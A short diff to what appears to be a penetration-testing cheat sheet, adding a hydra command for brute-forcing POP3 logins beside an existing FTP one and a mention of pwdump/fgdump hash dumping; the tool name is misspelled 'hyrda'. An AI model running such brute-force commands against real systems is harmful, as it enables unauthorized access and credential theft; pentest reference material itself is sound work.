@@ -55,6 +55,9 @@ pwdump and fgdump inject a DLL containning the hash dumping code into the ***Loc
 #### FTP Brute force attack
 - hyrda -L [user_file] -p [password] [victim_ip] ftp
 
+#### POP3 Brute force attack
+- hyrda -L [user_file] -P [password_file.txt] [victim_ip] -s [victim_port] -t 50 -I pop3
+
 ##### Usefull flag
 - -vV : verbose mode
 - -e nsr : login as password or login as password in reversed order etc
